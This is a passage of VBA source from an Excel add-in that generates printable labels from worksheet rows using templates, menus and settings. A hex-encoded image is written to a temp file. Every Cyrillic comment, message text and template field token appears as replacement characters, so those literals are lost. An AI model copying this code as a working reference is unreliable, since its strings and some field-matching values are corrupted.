    Dim ra As Range, ro As Range, n&, SheetNameSuffix$, pi As ProgressIndicator, rc&
    Set ra = GetRows()
    If ra Is Nothing Then Exit Sub
    
    If SETT.GetBoolean("CheckBox_SeparatelyByRows") Then
        Set pi = New ProgressIndicator
        pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", -1
        rc& = Intersect(Columns(1), ra.EntireRow, ra.EntireRow).Cells.Count
        pi.StartNewAction , , , , , rc&
        
        For Each ro In Intersect(ra.EntireRow, ra.EntireRow).Rows
            n = n + 1: SheetNameSuffix$ = " " & n
            pi.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & ro.Row
            If Not CreateLabelsForRange(ro, SheetNameSuffix$) Then Exit Sub
        Next
        pi.Hide
    Else
        CreateLabelsForRange ra
    End If
    
    If SETT.GetBoolean("CheckBox_SaveSheetAsFile") Then
        OpenFolder OUTPUT_FOLDER$
    End If
    
End Sub

Function CreateLabelsForRange(ByRef ra As Range, Optional SheetNameSuffix$) As Boolean
    On Error Resume Next
    Dim TemplateRange As Range, SourceSheet As Worksheet, msg$, NewFilename$, filename$
    Set SourceSheet = ActiveSheet
    
    Dim LC As Long: LC = CalculateLabelsCount(ra)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If LC = 0 Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        MsgBox msg, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        FormSetError F_Settings, "ComboBox_CountColumn", "CheckBox_AmountColumn"
        Exit Function
    End If
    
    If SETT.GetBoolean("CheckBox_ShowConfirmationMessage") Then
        msg = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & LC & " (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        If MsgBox(msg, vbQuestion + vbOKCancel + vbDefaultButton1, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbCancel Then Exit Function
    End If
    DoEvents
    
    Application.ScreenUpdating = False
    Set sht = Nothing: Set TemplateRange = Nothing
    Set sht = LoadActiveTemplate()
    If sht Is Nothing Then Application.ScreenUpdating = True: Exit Function
    Set TemplateRange = GetTemplateRange(sht)
    If TemplateRange Is Nothing Then GoTo ExitLabel
    
    
    Set pi = New ProgressIndicator
    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    
    Dim sh As Worksheet: Set sh = CreateLabelsWorksheet(SheetNameSuffix$)
    If sh Is Nothing Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        GoTo ExitLabel
    End If
    
    If Not TaggingSheet(sh, TemplateRange, LC) Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        GoTo ExitLabel
    End If
    
    ActiveWindow.View = xlNormalView
    If Not CloneTemplateAndFillInLabels(sh, TemplateRange, ra, LC) Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        GoTo ExitLabel
    End If
    ActiveWindow.View = xlPageBreakPreview
    
    If SETT.GetBoolean("CheckBox_FormulasToValues") Then
        sh.UsedRange.Value = sh.UsedRange.Value
    End If
    
    Application.DisplayAlerts = False
    If SETT.GetBoolean("CheckBox_AutoPrint") Then
        sh.PrintOut
        RunWithDelay "SetFocusToExcel"
    End If
    
    filename$ = Render(SETT.GetText("TextBox_OutputFilename"), ra.Rows(1).EntireRow)
    If filename$ = "" Then filename$ = Format(Now, "YYYY-MM-DD HH-NN-SS")
    
    If SETT.GetBoolean("CheckBox_SaveSheetAsFile") Then
        If SETT.GetBoolean("CheckBox_PDF") And (Val(Application.Version) > 11) Then
            NewFilename$ = OUTPUT_FOLDER$(True) & filename$ & ".pdf"
            sh.Parent.ExportAsFixedFormat 0, NewFilename$    ' xlTypePDF = 0
            sh.Parent.Close False
            'FWF.ShowFile NewFilename$
        Else
            NewFilename$ = OUTPUT_FOLDER$(True) & filename$ & ".xls"
            sh.Parent.SaveAs NewFilename$, xlWorkbookNormal
        End If
    End If
    Application.DisplayAlerts = True
    CreateLabelsForRange = True
    
ExitLabel:
    pi.Hide: DoEvents
    sht.Parent.Close False        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    If SETT.GetBoolean("CheckBox_ExternalRun") Then
        SourceSheet.Parent.Activate
        SourceSheet.Activate
        RunWithDelay "SetFocusToExcel"
    End If
    Application.ScreenUpdating = True
    ' sh.PrintPreview
End Function

Sub SetFocusToExcel()
    On Error Resume Next
    AppActivate Application.Name
End Sub

Function CloneTemplateAndFillInLabels(ByRef sh As Worksheet, ByRef tr As Range, ByVal AllRows As Range, ByVal LC&) As Boolean
    ' tr - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim ra As Range, i&, ro As Range, CountColumn&, calc As XlCalculation, cnt&, iter&, sha As Shape
    Application.ScreenUpdating = False
    calc = Application.Calculation
    Application.Calculation = xlCalculationManual
    
    pi.StartNewAction 30, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|...", " ", " ", LC
    Dim ReplaceFields As Collection, ReplaceField: Set ReplaceFields = RangeFieldNames(tr)
    Dim cell As Range, RowsForHide As Range, ColumnsForHide As Range
    
    If SETT.GetBoolean("CheckBox_AmountColumn") Then CountColumn& = SETT.GetNumber("ComboBox_CountColumn")
    
    For Each ro In AllRows.EntireRow
        If Not ro.EntireRow.Hidden Then
            cnt& = 1: If CountColumn& Then cnt& = Abs(Fix(Val(ro.Cells(CountColumn&))))
            
            For iter& = 1 To cnt&
                i = i + 1: DoEvents
                pi.SubAction , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & i & " |fffd||fffd| " & LC & ""
                Set ra = Nothing        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Set ra = sh.UsedRange.Find("# " & i, , xlValues, xlWhole).Resize(tr.Rows.Count, tr.Columns.Count)
                tr.Copy ra        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                'ra.Value = tr.Value    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Set RowsForHide = Nothing: Set ColumnsForHide = Nothing
                Set RowsForHide = FindAll(ra, "{|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|}", , xlPart)
                Set ColumnsForHide = FindAll(ra, "{|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|}", , xlPart)
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                ra.Replace "{|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|}", "", xlPart
                ra.Replace "{|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|}", "", xlPart
                
                For Each ReplaceField In ReplaceFields
                    ReplaceFieldInRange ra, ReplaceField, ro, i, iter
                Next ReplaceField
                
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                For Each sha In GetShapesForRange(ra)
                    pi.Line3 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & sha.Name & "|fffd| ..."
                    For Each ReplaceField In ShapeFieldNames(sha)
                        ReplaceFieldInShape sha, ReplaceField, ro, i, iter
                    Next ReplaceField
                    
                    pi.Line3 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & sha.Name & "|fffd| ..."
                    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| qr |fffd||fffd||fffd| dmx, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                    LoadBarcodeIntoShape sha
                    pi.Line3 = ""
                Next
                
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|,
                ' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                For Each cell In RowsForHide.Cells
                    If Len(Trim(cell)) = 0 Or (IsNumeric(cell) And Val(cell) = 0) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                        cell.EntireRow.Hidden = True
                    End If
                Next cell
                For Each cell In ColumnsForHide.Cells
                    If Len(Trim(cell)) = 0 Or (IsNumeric(cell) And Val(cell) = 0) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                        cell.EntireColumn.Hidden = True
                    End If
                Next cell
            Next iter&
        End If
    Next ro
    Application.Calculation = calc
    CloneTemplateAndFillInLabels = True
End Function


Attribute VB_Name = "mod_Main"
'---------------------------------------------------------------------------------------
' Module        : mod_Main                    Version:
' Author        : Igor Vakhnenko                   Date: 09.06.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Private Module        ': Option Explicit
Public Const PROJECT_NAME$ = "Labels", PROJECT_YEAR& = 2011
Public Const SHEET_NAME$ = "LABELS"

Private Sub CreateCommandBar(): CreateProgramCommandBar 0: End Sub

Sub CreateProgramCommandBar(Optional ByVal RefreshOnly As Boolean = True)
    On Error Resume Next
    SaveDefaultSettings

    Dim AddinMenu As CommandBar, coll As Collection, i&, MainMacroButton As Object, NeedToSelectTemplate As Boolean
    Application.ScreenUpdating = False
    If Not RefreshOnly Then Run DeleteOldCommandBar
    Set AddinMenu = GetCommandBar(PROJECT_NAME, True Or RefreshOnly)

    'Set MainMacroButton = Add_Control(AddinMenu, ct_BUTTON, 501, "main_macro_name", tt("MENU_001"), msoButtonIconAndCaption, True)
    'AddSettingsSwitcher AddinMenu, ct_DROPDOWN, , "main_macro_name", MainMacroButton

    ' menu begin

    Set coll = FilenamesCollection(TEMPLATES_FOLDER$, "*.xls*", 1)
    curr_template_name$ = CURRENT_TEMPLATE$

    Dim combo As CommandBarComboBox, filename, arr
    If coll.Count > 0 Then
        Mode& = IIf(coll.Count = 1, msoComboNormal, msoComboLabel)
        ' Mode& = msoComboNormal
        Set combo = Add_Control(AddinMenu, ct_DROPDOWN, 0, "ChangeActiveTemplate_FromMenu", tt("MENU_TemplateComboCaption") & ": ", Mode&, True, "TemplateFromMenu")

        For Each filename In coll
            combo.AddItem Dir(filename)
        Next
        combo.AddItem ADD_NEW_TEMPLATE_TEXT$

        For i = 1 To combo.ListCount
            If combo.list(i) = curr_template_name$ Then combo.ListIndex = i: Exit For
        Next i
        NeedToSelectTemplate = combo.ListIndex = 0
        combo.OnAction = "'" & ThisWorkbook.Name & "'!ChangeActiveTemplate_FromMenu"

        If NeedToSelectTemplate = True Then
            curr_template_name$ = combo.list(1)
            CURRENT_TEMPLATE$ curr_template_name$
            combo.ListIndex = 1
            NeedToSelectTemplate = False
        End If


        Add_Control(AddinMenu, ct_BUTTON, 0, "0", " ", msoButtonCaption, False).Enabled = 0
        Set MainMacroButton = Add_Control(AddinMenu, ct_BUTTON, 723, "CreateLabels", tt("MENU_CreateLabels"), msoButtonIconAndCaption, True)           ' 623
        Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0

        Set subMenu2 = Add_Control(AddinMenu, ct_POPUP, 0, "", tt("MENU_Templates"), , True)

        Add_Control subMenu2, ct_BUTTON, 137, "CreateNewLabelTemplate", tt("MENU_CreateNewTemplate"), msoButtonIconAndCaption, True
        Add_Control subMenu2, ct_BUTTON, 162, "EditLabelTemplate", tt("MENU_EditTemplate"), msoButtonIconAndCaption, True
        Add_Control subMenu2, ct_BUTTON, 3, "SaveLabelTemplate", tt("MENU_SaveTemplate"), msoButtonIconAndCaption
        Add_Control subMenu2, ct_BUTTON, 138, "DeleteLabelTemplate", tt("MENU_DeleteTemplate"), msoButtonIconAndCaption, True
        
        If Developer Or (Val(Application.Version) >= 15) Then
            Add_Control subMenu2, ct_BUTTON, 1759, "UpdateAddinToolbar", tt("MENU_RefreshToolbar"), msoButtonIconAndCaption, True
        End If

    Else        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Add_Control AddinMenu, ct_BUTTON, 786, "CreateNewLabelTemplate", tt("MENU_CreateNewTemplate"), msoButtonIconAndCaption, True
    End If


    AddSettingsSwitcher AddinMenu, ct_DROPDOWN, , "CreateLabels", MainMacroButton
    Add3Buttons AddinMenu
    ' menu end

    If Not RefreshOnly Then
        RunWithDelay "ActivateAddinsTab"
        AddUpdateButton AddinMenu
        RunWithDelay "ActivateAddinsTab"
    End If

    If Developer Then
        Add_Control(AddinMenu, ct_BUTTON, 0, "0", "", msoButtonIconAndCaption, False).Enabled = 0
        'Add_Control AddinMenu, ct_BUTTON, , "ShowFirstRunForm", "Show FirstRun Form", msoButtonIconAndCaption, True
        Add_Control AddinMenu, ct_BUTTON, , "ToggleIsAddin", "Show/Hide TR Sheet", msoButtonIconAndCaption, True
    End If

    Application.ScreenUpdating = True
End Sub

Sub SaveDefaultSettings()
    On Error Resume Next
    With SETT
        .LoadAllSettings
        'If .IsSettingBlank("Setup\PIC_FOLDER") Then SETT.SetText "PIC_FOLDER", tt("CONST_PIC_FOLDER"), "Setup"
        .AddDefaultValue "ComboBox_BaseColumn", 2, True, True
        .AddDefaultValue "ComboBox_CountColumn", 5, True, True

        .AddDefaultValue "ComboBox_count_w", 2, , True
        .AddDefaultValue "ComboBox_count_h", 3, , True
        .AddDefaultValue "ComboBox_FirstRow", 1, , True
        .AddDefaultValue "ComboBox_IndentWidth", "2", , True
        .AddDefaultValue "CheckBox_UseIndents", True
        .AddDefaultValue "OptionButton_LineNormal", True

        .AddDefaultValue "CheckBox_ShowConfirmationMessage", True
        .AddDefaultValue "CheckBox_AutoPrint", False

        .AddDefaultValue "TextBox_OutputFilename", "{time=YYYY-MM-DD HH-NN-SS}"
    End With
End Sub

Sub UpdateAddinToolbar()
    RunWithDelay "CreateProgramCommandBar", 0.6
End Sub

Sub ToggleIsAddin()
    On Error Resume Next
    ThisWorkbook.IsAddin = Not ThisWorkbook.IsAddin
End Sub

Sub ShowUsageExample()        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    On Error Resume Next: UsageExampleExists True
End Sub

Function GetFile_MainPicture() As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim F_TXT$, buf$, tmp_file$: Const BufLen& = 5000

    F_TXT$ = F_TXT$ & "4BFA0BFA750D67C7BAED1AF3A59ADA7ACF0CF3466668A5589CA41148B10192448E65651CFF0080F04F1D0F2FDA95BF3F54304741E3AD5269E2832C655689A252AF8383F7E4F603EE741E83FBBFA37F2AA5FD05FD3ACE7F0FE962073069340CBB4EC0D02E09ED9E3A85B5F68BAEAC564C342A4535536E4960991D98451C90A460ED6186612B64F2328401EFD1163ED36785756AA9A699351A76E58E35520A3C696162F8B0DB918AB82370009CE38E828CE88AB27F71E96D18462488541CFC580013FEDCFF00CF41CDA4BA51B9259D1F4BAEB1D776478621BC381C1073C77FCBA452FDA46B296BC8FD8CAAC657560D926255BBE9C9620904ED23D8F2C78E074CF45F145CF12687AEFADAF1567AD1BA244AAC19D72E3CCE78DA76E077CAB67B740FF45D46957D034D8E6B50C6FE963E19C03F747EA3A39757D35CA85BD5C96C6DC4839CFB63A9BA16B4D8F49A914DA458B32FA6899DA1ADBF76106093DFE43A615D74B7686BC5A24CA2358E44DF5F6AA862BDCF71C6476C74143EFD611D0A91793E5D5853C8DDE56D403CBDDEF8F967BF5926A0AF724AC2BD8051F6190C784CEDDDC1EE3B71DF8EB23AB6DB0B1352B58697CB122A6547D4FC87D7A065D7749D3C410B58481A8EA08EEFB177D7201F7E73ED8E3F3E8CBB75A9EC6F4D2CA87258C633"
    F_TXT$ = F_TXT$ & "B40FA77E83592DD785F6493C68C3B3381D07AC4F0BE8B7424A8C4D77C00C0E7E1E964B6349D5AC466D687724332A82D3D36DAA33C6ECF0318EB26A9A6C7A55E7ABA47A393D33B65E3DAC32A411F801D030D06944DE1DD398B4FCD68CF162403EE8ED9EA66EF8B66A36AF576D1A495ABD8F4F1B45AAB9591C42F3B8C9030563404FBF2C067DC83B4DF1752A1A5D5A72C161A482258D8A8520903071CF4059BDE14B94A5A93E9565E196CBDA701CA932BE4336E0D9190C4100E3048F6E807FE20D496C430D4D2EE4C6E33AD02D7DD04FE5FF0069BBDF663B7BE7E9D5455D5F43B1A7D1B725F35BD6D54B51473DD647F2D9776705BE5FF9D4C4C7C173BCEEFA2580D31058A394DA47F930E3667BEDC67BE7AEBB6BC3B72DC73B57B8890D55AD140AABE520524A92B9F8B6E78078E3A0A2B9E20D0AA7ED055B73CF250AD2599D21B1236D58C12C33BB19E3DBA454FC710D8D5574F9B4AB70CD14F0D7B846A0EC2069982C5B7DB783919F6C7D7ACA84BE14A11448BA75C94475BD3112B060E0A046665DD82CCA0027BF5F55A5F07549EB4F0E8D644B59B7C6ED21625B3905B2FF001907DB7671DB1D05979BA4EF087515DE5B685F5CD9279E3EF7BF07F0E86BC285BD02F4F4ED9B11AC4E37476DA45C85CE38623E5C7516D07844871E8B510B248F24"
    F_TXT$ = F_TXT$ & "8A241872EC1DB3CF76543FF51F5CB4AFABE8F5B4DB7A769F5AD235C017321046EF2D2207DFDB08BF9F41FFD9"
    For i = 1 To Len(F_TXT$) / 2
        buf$ = buf$ & Chr(Val("&H" & Mid(F_TXT$, 2 * i - 1, 2)))
        If Len(buf$) > BufLen& Then res$ = res$ & buf$: buf$ = "": DoEvents
    Next: res$ = res$ & buf$
    tmp_file$ = Environ("tmp") & "\file_MainPicture_" & PROJECT_NAME$: Kill tmp_file$
    ff& = FreeFile: Open tmp_file$ For Binary Access Write As #ff
    Put #ff, , res$
    Close #ff
    If FileLen(tmp_file$) = Len(F_TXT$) / 2 Then GetFile_MainPicture = tmp_file$
End Function

Sub ShowManual(ByRef URL$)
    On Error Resume Next
    If IsURL(URL$) Then FWF.FollowHyperlink URL
End Sub
Attribute VB_Name = "mod_NewFunctions"
'---------------------------------------------------------------------------------------
' Module        : mod_NewFunctions                 Version: 1
' Author        : Igor Vakhnenko                   Date: 09.06.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Explicit: Option Private Module

Sub EditLabelTemplate()
    On Error Resume Next
    Dim sh As Worksheet
    Set sh = LoadActiveTemplate(True)
    sh.Activate
End Sub

Sub SaveLabelTemplate()
    On Error Resume Next
    Dim sh As Worksheet, DefaultRangeAddress$, SheetName$, msg$, ra As Range, S As Worksheet
    If ActiveWorkbook Is Nothing Then Exit Sub

    If ActiveWorkbook.Path & "\" <> TEMPLATES_FOLDER$ Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
               "(|fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & TEMPLATES_FOLDER$, vbExclamation
        Exit Sub
    End If
    Set sh = ActiveWorkbook.Worksheets(1)
    sh.Activate

    DefaultRangeAddress$ = GetTemplateRange(sh, True).Address(, , Application.ReferenceStyle)
    msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
          "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
    Set ra = Application.InputBox(msg, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", DefaultRangeAddress$, , , , , 8)
    If ra Is Nothing Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd|.|fffd|. |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical
        Exit Sub
    End If

    SheetName$ = Replace(ra.Address(0, 0), ":", "-")
